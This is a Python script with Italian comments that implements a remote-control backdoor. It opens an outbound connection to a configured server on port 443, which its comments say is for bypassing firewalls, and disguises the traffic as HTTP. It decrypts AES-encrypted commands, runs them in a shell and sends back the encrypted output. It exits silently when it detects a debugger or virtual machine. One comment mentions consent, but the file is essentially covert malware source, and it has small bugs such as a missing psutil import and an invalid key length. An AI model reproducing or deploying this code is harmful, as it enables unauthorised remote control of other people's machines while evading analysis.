import socket
import subprocess
import os
import time
import sys
import ctypes
from Crypto.Cipher import AES
import base64
import random

# ===== CONFIGURAZIONE =====
SERVER_IP = "192.168.1.100"  # Cambia con il tuo IP (consenso obbligatorio!)
SERVER_PORT = 443             # Porta comune per bypassare firewall
RECONNECT_DELAY = 10          # Tentativi di riconnessione (secondi)
AES_KEY = b"supersecretkey123"  # Chiave AES a 16/24/32 byte
# =========================

class AntiAnalysis:
    @staticmethod
    def is_debugger_present():
        try:
            return ctypes.windll.kernel32.IsDebuggerPresent() != 0
        except:
            return False

    @staticmethod
    def check_vm():
        vm_indicators = [
            "vboxservice", "vmware", "qemu", "xen"
        ]
        for process in psutil.process_iter(['name']):
            if any(indicator in process.info['name'].lower() for indicator in vm_indicators):
                return True
        return False

class SecureComms:
    def __init__(self, key):
        self.key = key

    def encrypt(self, data):
        cipher = AES.new(self.key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data.encode())
        return base64.b64encode(cipher.nonce + tag + ciphertext)

    def decrypt(self, data):
        raw = base64.b64decode(data)
        nonce, tag, ciphertext = raw[:16], raw[16:32], raw[32:]
        cipher = AES.new(self.key, AES.MODE_EAX, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode()

def execute_command(cmd):
    try:
        result = subprocess.check_output(
            cmd, shell=True, 
            stderr=subprocess.PIPE, 
            stdin=subprocess.PIPE
        )
        return result.decode('utf-8', errors='replace')
    except Exception as e:
        return f"[!] Error: {str(e)}"

def fake_http_traffic():
    headers = [
        "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n",
        "POST /api/data HTTP/1.1\r\nHost: example.com\r\n\r\n"
    ]
    return random.choice(headers)

def main():
    if AntiAnalysis.is_debugger_present() or AntiAnalysis.check_vm():
        sys.exit(0)  # Uscita silenziosa in ambienti di analisi

    secure = SecureComms(AES_KEY)

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30)
            s.connect((SERVER_IP, SERVER_PORT))
            s.send(fake_http_traffic().encode())  # Camuffamento

            while True:
                encrypted_cmd = s.recv(4096)
                if not encrypted_cmd:
                    break

                cmd = secure.decrypt(encrypted_cmd)
                
                if cmd == "exit":
                    s.close()
                    return
                
                result = execute_command(cmd)
                encrypted_result = secure.encrypt(result)
                s.send(encrypted_result)

        except Exception as e:
            time.sleep(RECONNECT_DELAY)
        finally:
            try:
                s.close()
            except:
                pass

if __name__ == "__main__":
    main()